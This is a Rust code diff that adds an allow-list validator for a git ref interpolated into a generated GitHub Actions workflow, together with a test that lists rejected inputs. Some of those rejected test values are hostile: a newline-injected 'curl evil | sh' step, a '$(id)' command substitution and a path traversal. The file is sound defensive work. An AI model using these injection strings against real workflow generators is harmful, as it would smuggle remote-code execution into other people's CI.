@@ -27,6 +27,35 @@ pub(crate) const DEFAULT_WORKFLOW_PATH: &str = ".github/workflows/deepcode.yml";
 /// once there are installations that are not ours to break.
 pub(crate) const DEFAULT_WORKFLOW_REF: &str = "main";
 
+/// `--ref` as it may appear in the generated workflow, or `None` when it may
+/// not appear at all.
+///
+/// The third and last of the values `install` interpolates into the YAML, and
+/// the one that was still raw after `--lang` and `--permission-mode` were
+/// parsed to canonical tokens at the CLI boundary. It reaches the file
+/// unquoted, right after the `@` of `uses: <workflow>@<ref>`, so a value
+/// carrying a space, a `#`, a `:` or a newline does not produce a workflow
+/// that fails loudly — it produces a *different* YAML document, in a file the
+/// user then commits and someone else's CI runs.
+///
+/// An allow-list rather than a blocklist, and deliberately narrower than
+/// `git check-ref-format`: refs that name a branch or a tag are
+/// `[A-Za-z0-9._/-]`, so nothing legitimate is refused, and what reaches the
+/// file is a single YAML-inert token by construction. `..` and a leading or
+/// trailing `/` or `.` are refused on top — git rejects them too, and they are
+/// the spellings that read as a path traversal to a human reviewing the diff.
+pub(crate) fn parse_workflow_ref(value: &str) -> Option<String> {
+    let value = value.trim();
+    let shaped = !value.is_empty()
+        && value
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '_' | '-' | '/'))
+        && !value.contains("..")
+        && !value.starts_with(['/', '.'])
+        && !value.ends_with(['/', '.']);
+    shaped.then(|| value.to_string())
+}
+
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub(crate) struct WorkflowSpec {
     /// Git ref of the reusable workflow — [`DEFAULT_WORKFLOW_REF`] unless the
@@ -130,6 +159,36 @@ mod tests {
     /// The default tracks a branch so a workflow fix does not need a CLI
     /// release. Locking it down here because flipping it back to a version
     /// would otherwise pass every other test in this file.
+    /// The last value `install` splices into the YAML, held to the same
+    /// "one fixed token by construction" rule as `--lang` and
+    /// `--permission-mode`. The rejected spellings are the ones that would
+    /// change the shape of the generated document rather than break it.
+    #[test]
+    fn a_workflow_ref_is_a_single_yaml_inert_token() {
+        for good in ["main", "v0.5.0", "release/1.x", "feature_a-b", "abc123"] {
+            assert_eq!(parse_workflow_ref(good).as_deref(), Some(good), "{good}");
+        }
+        assert_eq!(parse_workflow_ref("  main  ").as_deref(), Some("main"));
+        for bad in [
+            "",
+            "   ",
+            "main with space",
+            "main\n      run: curl evil | sh",
+            "main # comment",
+            "main: x",
+            "../../etc",
+            "a..b",
+            "/main",
+            "main/",
+            ".main",
+            "main.",
+            "main\"",
+            "$(id)",
+        ] {
+            assert!(parse_workflow_ref(bad).is_none(), "{bad:?} must be refused");
+        }
+    }
+
     #[test]
     fn the_default_ref_is_a_branch_not_a_version() {
         assert_eq!(DEFAULT_WORKFLOW_REF, "main");
